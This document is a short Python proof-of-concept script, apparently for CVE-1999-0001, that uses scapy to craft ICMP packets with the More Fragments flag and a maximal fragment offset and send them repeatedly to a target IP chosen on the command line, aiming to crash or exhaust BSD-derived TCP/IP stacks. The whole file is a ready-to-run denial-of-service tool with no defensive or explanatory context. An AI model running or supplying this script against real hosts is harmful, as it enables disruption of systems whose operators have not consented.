#!/usr/bin/env python3
# CVE-1999-0001 High-Level PoC
# Target: BSD-derived TCP/IP stack
# Effect: Denial of Service via malformed fragmented IP packet

import argparse
from scapy.all import IP, ICMP, send

def craft_malformed_packet(target_ip, ttl, frag_offset):
    """
    Create a malformed IP packet with excessive fragment offset
    and MF (More Fragments) flag to cause kernel-level resource exhaustion or crash.
    """
    packet = IP(
        dst=target_ip,
        ttl=ttl,
        flags="MF",
        frag=frag_offset
    ) / ICMP()
    return packet

def send_attack_packets(target_ip, count, ttl, frag_offset, verbose):
    for i in range(count):
        pkt = craft_malformed_packet(target_ip, ttl, frag_offset)
        send(pkt, verbose=0)
        if verbose:
            print(f"[+] Sent malformed packet #{i+1} to {target_ip} (frag_offset={frag_offset}, ttl={ttl})")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-1999-0001 - BSD TCP/IP stack DoS via malformed fragmented IP packets"
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-c", "--count", type=int, default=5, help="Number of packets to send (default: 5)")
    parser.add_argument("--ttl", type=int, default=64, help="TTL value (default: 64)")
    parser.add_argument("--frag-offset", type=int, default=8191, help="Fragment offset value (default: 8191)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    send_attack_packets(
        target_ip=args.target,
        count=args.count,
        ttl=args.ttl,
        frag_offset=args.frag_offset,
        verbose=args.verbose
    )
